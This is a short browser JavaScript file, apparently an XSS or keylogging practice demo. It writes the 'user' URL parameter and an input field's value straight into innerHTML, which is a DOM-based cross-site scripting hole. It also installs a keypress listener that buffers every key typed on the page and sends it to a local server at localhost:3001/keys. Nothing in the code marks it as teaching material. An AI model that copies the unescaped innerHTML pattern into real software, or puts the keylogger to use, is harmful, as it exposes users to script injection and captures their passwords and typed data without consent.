console.log("Hi");
let inp = document.getElementById("inp");

inp.onblur = () => {
    document.getElementById("res").innerHTML = `Search Results for: ${inp.value}`;
}


// let res = document.getElementById("res").innerHTML = `Search Results for: ${inp}`;


let user = new URLSearchParams(window.location.search);
document.getElementById("res").innerHTML = user.get('user');

var timeout;
var buffer = "";
document.querySelector("body").addEventListener("keypress", (event) => {
    if (event.which !== 0) {
        clearTimeout(timeout);
        buffer += String.fromCharCode(event.which);
        timeout = setTimeout(() => {
            var xhr = new XMLHttpRequest();
            var uri = "http://localhost:3001/keys?data=" + encodeURIComponent(buffer);
            xhr.open("GET", uri);
            xhr.send();
            buffer = "";
        }, 400);
    }
}
);